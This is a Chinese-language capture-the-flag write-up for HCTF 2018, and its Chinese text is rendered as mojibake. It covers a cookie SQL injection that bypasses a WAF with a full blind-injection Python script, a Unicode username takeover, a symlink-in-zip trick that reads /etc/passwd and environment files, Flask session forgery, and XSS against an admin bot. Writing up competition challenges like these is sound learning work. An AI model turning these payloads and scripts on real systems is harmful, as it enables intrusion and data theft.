<h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><p>æ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªQQé’“é±¼ç«™ï¼Œä¸»é¡µä¼šè·³è½¬åˆ°ç©ºé—´<br><a href="http://kzone.2018.hctf.io/www.zip" target="_blank" rel="noopener">http://kzone.2018.hctf.io/www.zip</a> å¯ä»¥ä¸‹è½½åˆ°æºç <br>install.sql æ–‡ä»¶ä¸­æœ‰adminå¯†ç ï¼Œadminã€‚<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`fish_admin`</span> (<span class="string">`id`</span>, <span class="string">`username`</span>, <span class="string">`password`</span>, <span class="string">`name`</span>, <span class="string">`qq`</span>, <span class="string">`per`</span>) <span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>, <span class="string">'admin'</span>, <span class="string">'21232f297a57a5a743894a0e4a801fc3'</span>, <span class="string">'å°æ°'</span>, <span class="string">'1503816935'</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><br>ä¸è¿‡ç™»é™†ä¸ä¸Šå»ï¼Œå¯†ç è¢«æ”¹äº†</p>
<p>å®¡è®¡æºç ç¿»åˆ°äº†member.phpï¼Œå‘ç°è¿™è¾¹æ²¡æœ‰addslashesï¼Œå¹¶ä¸”æ— éœ€ç™»å½•ä¹Ÿå¯è®¿é—®</p>
<p><img src="/img/2018-hctf-5.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°è¿™æ®µä»£ç ä»cookieè·å–äº†ç™»é™†ä¿¡æ¯ï¼Œå¦‚æœç¬¦åˆå‡ ä¸ªifï¼Œå°±èƒ½ç™»é™†<br>æƒ³åˆ°é€šè¿‡æ³¨å…¥ ï¼Œunion select æ›¿æ¢æ‰admin_userå’Œadmin_pass<br>å°è¯•æ„é€ å¼±ç±»å‹ç»•è¿‡ï¼š<br>Cookie: PHPSESSID=s33h9c1u8bq5t0r8s4dura0c76; islogin=1; login_data={â€œadmin_userâ€:â€adminâ€™||â€™1â€,â€admin_passâ€:65}<br>ï¼ˆä¸€å¼€å§‹æ²¡æ„é€ å‡ºæ¥ï¼Œç„¶åå°±è½¬æ€è·¯å»bypass wafäº†</p>
<p>å‚è€ƒè¿™ç¯‡æ–‡ç« <br><a href="http://blog.sina.com.cn/s/blog_1574497330102wruv.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_1574497330102wruv.html</a><br>è™½ç„¶ä»–æ²¡ç»•è¿‡å…³é”®è¯æ£€æµ‹ï¼Œä½†æ˜¯é¡ºç€ä»–çš„æ€è·¯å°è¯•æ„é€ äº†<br> \u0075nionï¼Œæœ¬åœ°æµ‹è¯•å‘ç°json_decodeåå˜ä¸ºunionï¼ŒæˆåŠŸbypass waf<br>æ„é€ ä¸€ä¸ªsleepçš„cookieï¼Œæ”¾åˆ°æœåŠ¡ç«¯æµ‹è¯•ä¹Ÿsleepäº†ï¼Œè¯æ˜æ­¤å¤„æ³¨å…¥å¯è¡Œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:PHPSESSID&#x3D;t0k91etf5fecbi4t25d7hprtm3;islogin&#x3D;1;login_data&#x3D;&#123;&quot;admin_user&quot;:&quot;admin111&#39;&#x2F;**&#x2F;\u0075nion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6&#x2F;**&#x2F;from&#x2F;**&#x2F;fish_admin&#x2F;**&#x2F;where&#x2F;**&#x2F;\u0073leep(3)\u003d&#39;1&quot;,&quot;admin_pass&quot;:&quot;3b30a11aaba222edd6e704e9959b94643ed4ffd9&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/2018-hctf-6.png" alt=""></p>
<p>åé¢å°±æŠŠæ‰€æœ‰å…³é”®è¯ç”¨è¿™ç§æ–¹æ³•ç»•è¿‡ï¼Œå°±èƒ½ç›´æ¥æ³¨å…¥äº†ï¼Œæœ€åflagåœ¨ F1444gè¡¨çš„F1a9å­—æ®µ<br>é™„ä¸Šæ³¨å…¥è„šæœ¬<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#!coding:utf-8#</span></span><br><span class="line"><span class="comment"># xishir</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment">#hctf&#123;4526a8cbd741b3f790f95ad32c2514b9&#125;</span></span><br><span class="line"></span><br><span class="line">ss = <span class="string">"&#123;&#125;_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-+"</span></span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">"http://kzone.2018.hctf.io/admin/"</span></span><br><span class="line"><span class="comment">#url="http://127.0.0.1/hctf/www/admin/"</span></span><br><span class="line"></span><br><span class="line">union = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'u'</span>)))[<span class="number">2</span>:]+<span class="string">'nion'</span></span><br><span class="line">sleep = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'s'</span>)))[<span class="number">2</span>:]+<span class="string">'leep'</span></span><br><span class="line">ascii = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'a'</span>)))[<span class="number">2</span>:]+<span class="string">'scii'</span></span><br><span class="line">ok = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'='</span>)))[<span class="number">2</span>:]</span><br><span class="line">substr = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'s'</span>)))[<span class="number">2</span>:]+<span class="string">'ubstr'</span></span><br><span class="line">over = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'#'</span>)))[<span class="number">2</span>:]</span><br><span class="line">blank = <span class="string">"/**/"</span></span><br><span class="line">orr = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'o'</span>)))[<span class="number">2</span>:]+<span class="string">'r'</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">Â  Â  <span class="keyword">print</span> i</span><br><span class="line">Â  Â  <span class="keyword">for</span> j <span class="keyword">in</span> ss:</span><br><span class="line">Â  Â  Â  Â  payload = <span class="string">"admin' and (substr((select binary F1a9 from F1444g limit 1),"</span>+str(i)+<span class="string">",1)='"</span>+str(j)+<span class="string">"') and sleep(4) and 1='1"</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">'sleep'</span>,sleep)</span><br><span class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">'union'</span>,union)</span><br><span class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">'='</span>,ok)</span><br><span class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">'#'</span>,over)</span><br><span class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">' '</span>,blank)</span><br><span class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">'ascii'</span>,ascii)</span><br><span class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">'substr'</span>,substr)</span><br><span class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">'or'</span>,orr)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  jsons = <span class="string">'&#123;"admin_user":"'</span>+payload+<span class="string">'","admin_pass":"3b30a11aaba222edd6e704e9959b94643ed4ffd9"&#125;'</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  cookie=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"t0k91etf5fecbi4t25d7hprtm3"</span>,</span><br><span class="line">Â  Â  Â  Â  <span class="string">"islogin"</span>:<span class="string">"1"</span>,</span><br><span class="line">Â  Â  Â  Â  <span class="string">"login_data"</span>:jsons&#125;</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  t1=time.time()</span><br><span class="line">Â  Â  Â  Â  r1 = r.get(<span class="string">"http://kzone.2018.hctf.io"</span>,cookies=cookie)</span><br><span class="line">Â  Â  Â  Â  t2=time.time()</span><br><span class="line">Â  Â  Â  Â  <span class="comment">#print t2</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> (t2-t1)&gt;<span class="number">4</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment">#print "aaaaaaaa"</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  flag+=str(j)</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">print</span> i,flag</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/2018-hctf-7.png" alt=""></p>
<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>æ‰¾åˆ°æºç    <a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a><br><img src="/img/2018-hctf-8.png" alt=""></p>
<p><img src="/img/2018-hctf-10.png" alt=""><br>çœ‹åˆ°strlowerå‡½æ•°å¾ˆå¥‡æ€ª<br>å‚è€ƒï¼š<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=1411</a><br>æœ€åè§£é¢˜æ­¥éª¤å¦‚ä¸‹</p>
<ol>
<li>æ³¨å†Œä¸€ä¸ªá´¬dminè´¦å·</li>
<li>ç™»é™†á´¬dminï¼Œå‘ç°é¡µé¢æ˜¾ç¤ºAdmin</li>
<li>ä¿®æ”¹å¯†ç ï¼Œé€€å‡ºç™»å½•</li>
<li>é‡æ–°ç™»é™†Adminï¼Œçœ‹åˆ°flag<br><img src="/img/2018-hctf-11.png" alt=""></li>
</ol>
<h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><p>ä¼ ä¸ªzipï¼Œä¼šè§£å‹ç¼©å¹¶ä¸”è¯»å–<br>å°è¯•ä¼ ä¸ªé“¾æ¥æ–‡ä»¶ln -s /etc/passwd test å¹¶å‹ç¼©ä¸Šä¼ <br>è¯»åˆ°/etc/passwd</p>
<p>ç„¶åå°±æ˜¯å„ç§æ–‡ä»¶è¯»å–<br>åœ¨ /proc/self/environè¯»å–åˆ°ä¸€ä¸ªå¥½ä¸œè¥¿</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;uwsgiSUPERVISOR_GROUP_NAME&#x3D;uwsgiHOSTNAME&#x3D;323a960bcc1aSHLVL&#x3D;0PYTHON_PIP_VERSION&#x3D;18.1HOME&#x3D;&#x2F;rootGPG_KEY&#x3D;0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI&#x3D;&#x2F;app&#x2F;it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD&#x3D;0UWSGI_PROCESSES&#x3D;16STATIC_URL&#x3D;&#x2F;staticUWSGI_CHEAPER&#x3D;2NGINX_VERSION&#x3D;1.13.12-1~stretchPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binNJS_VERSION&#x3D;1.13.12.0.2.0-1~stretchLANG&#x3D;C.UTF-8SUPERVISOR_ENABLED&#x3D;1PYTHON_VERSION&#x3D;3.6.6NGINX_WORKER_PROCESSES&#x3D;autoSUPERVISOR_SERVER_URL&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sockSUPERVISOR_PROCESS_NAME&#x3D;uwsgiLISTEN_PORT&#x3D;80STATIC_INDEX&#x3D;0PWD&#x3D;&#x2F;app&#x2F;hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH&#x3D;&#x2F;app&#x2F;staticPYTHONPATH&#x3D;&#x2F;appUWSGI_RELOADS&#x3D;0</span><br></pre></td></tr></table></figure>
<p>ç„¶åç›´æ¥è¯»/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniæ–‡ä»¶å¾—åˆ°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi] module &#x3D; hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable&#x3D;app</span><br></pre></td></tr></table></figure>
<p>æŒ‰éƒ¨å°±ç­è¯»å–é¡¹ç›®æ–‡ä»¶ /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py<br>å¾—åˆ°<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">Â  Â  <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">Â Â  Â  Â  Â  Â  filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">Â  Â  error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">Â  Â  <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">Â  Â  Â  Â  session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">Â  Â  <span class="keyword">else</span>:</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">Â  Â  username=request.form[<span class="string">'username'</span>]</span><br><span class="line">Â  Â  password=request.form[<span class="string">'password'</span>]</span><br><span class="line">Â  Â  <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">Â  Â  Â  Â  session[<span class="string">'username'</span>] = username</span><br><span class="line">Â  Â  <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">Â  Â  session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">Â  Â  <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">Â  Â  <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">Â  Â  file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">Â  Â  <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">Â  Â  <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">Â  Â  Â  Â  filename = secure_filename(file.filename)</span><br><span class="line">Â  Â  Â  Â  file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">Â  Â  Â  Â  file.save(file_save_path)</span><br><span class="line">Â  Â  <span class="keyword">else</span>:</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">Â  Â  Â  Â  extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">Â  Â  Â  Â  os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">Â  Â  Â  Â  read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">Â  Â  Â  Â  file = read_obj.read()</span><br><span class="line">Â  Â  Â  Â  read_obj.close()</span><br><span class="line">Â  Â  Â  Â  os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">Â  Â  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">Â  Â  Â  Â  file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">Â  Â  os.remove(file_save_path)</span><br><span class="line">Â  Â  <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">Â  Â  <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">Â  Â  <span class="comment">#app.run(debug=True)</span></span><br><span class="line">Â  Â  app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure></p>
<p>å› ä¸ºæœ‰è¿™æ®µ<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br></pre></td></tr></table></figure><br>å¦‚æœæ–‡ä»¶é‡Œæœ‰hctfå°±è¿”å›ä¸»é¡µ<br>æ‰€ä»¥ä¸èƒ½ç›´æ¥è¯»flag.pyï¼Œä¹Ÿæ²¡æœ‰flag.pyc<br>åé¢è¯»index.htmlå‘ç°adminç”¨æˆ·ç™»å½•å°±èƒ½çœ‹åˆ°flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Â Â &#123;% if user &#x3D;&#x3D; &#39;admin&#39; %&#125;</span><br><span class="line">Â  Â  Â  Â  Your flag: &lt;br&gt;</span><br><span class="line">Â  Â  Â  Â  &#123;&#123; flagÂ  &#125;&#125;</span><br></pre></td></tr></table></figure><br>æƒ³åˆ°è¦è¯»secretï¼Œä¼ªé€ adminçš„sessionï¼Œå‘ç°ä»£ç é‡Œçš„secretæ˜¯ä¼ªéšæœºçš„<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure><br>éšæœºæ•°ç§å­å›ºå®šä¸ºmacåœ°å€ï¼Œè¯»å– /sys/class/net/eth0/address å¯ä»¥å¾—åˆ°<br>ç„¶åå¸¦å…¥seedï¼Œæœ¬åœ°è·‘ä¸€ä¸‹ï¼Œç™»é™†adminæ‹¿åˆ°cookieï¼Œå†æ”¾åˆ°ç½‘ç«™ä¸Šå°±èƒ½çœ‹åˆ°flagäº†<br><img src="/img/2018-hctf-12.png" alt=""></p>
<h2 id="share"><a href="#share" class="headerlink" title="share"></a>share</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œä¸»é¡µç¿»è¯‘ä¸€ä¸‹å¯ä»¥å¾—åˆ°è¿™äº›ä¿¡æ¯</p>
<p><img src="/img/2018-hctf-1.png" alt=""><br>æ˜¯ä¸ªè®©ç”¨æˆ·åˆ†äº«åº”ç”¨çš„ç½‘ç«™ï¼Œå¹¶ä¸”ç®¡ç†å‘˜å¯ä»¥æŠŠåº”ç”¨æ¨ç»™æŸä¸ªç”¨æˆ·</p>
<p>/Alphatestå¯ä»¥çœ‹åˆ°ä¸€ä¸ªfilenumber å’Œè‡ªå·±çš„uid</p>
<p><img src="/img/2018-hctf-2.png" alt=""></p>
<p>/share å¯ä»¥åˆ†äº«ä¸œè¥¿ç»™ç®¡ç†å‘˜ï¼ŒçŒœæµ‹å­˜åœ¨xssï¼Œcontextæ¡†ä¼ äº†ä¸ªæ®µxssä»£ç ï¼Œå‘ç°èƒ½æ¥æ”¶åˆ°adminçš„è¯·æ±‚ï¼Œbotæ˜¯PhantomJS/2.1.1ï¼Œè¯´æ˜èƒ½æ‰§è¡Œjsï¼Œä½†æ˜¯å¼€äº†httponlyæ‰“ä¸åˆ°cookieï¼ŒçŒœæµ‹æ˜¯è¦CSRFï¼Œurlæ¡†ä¼ çš„ä¸œè¥¿å¥½åƒæ²¡å•¥ç”¨</p>
<p><img src="/img/2018-hctf-3.png" alt=""></p>
<p>æ ¹æ®ä¸»é¡µæç¤ºå¯èƒ½æœ‰æºç æ³„æ¼ï¼Œåœ¨robots.txt çœ‹åˆ°äº†ä¸‰ä¸ªæ¥å£çš„ä»£ç </p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">/* this terrible code *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">class FileController &lt; ApplicationController</span></span><br><span class="line"><span class="regexp">  before_action :authenticate_user!</span></span><br><span class="line"><span class="regexp">  before_action :authenticate_role</span></span><br><span class="line"><span class="regexp">  before_action :authenticate_admin</span></span><br><span class="line"><span class="regexp">  protect_from_forgery :except =&gt; [:upload , :share_people_test]</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp"># post /file</span><span class="regexp">/upload</span></span><br><span class="line"><span class="regexp">  def upload</span></span><br><span class="line"><span class="regexp">    if(params[:file][:myfile] != nil &amp;&amp; params[:file][:myfile] != "")</span></span><br><span class="line"><span class="regexp">      file = params[:file][:myfile]</span></span><br><span class="line"><span class="regexp">      name = Base64.decode64(file.original_filename)</span></span><br><span class="line"><span class="regexp">      ext = name.split('.')[-1]</span></span><br><span class="line"><span class="regexp">      if ext == name || ext ==nil</span></span><br><span class="line"><span class="regexp">        ext=""</span></span><br><span class="line"><span 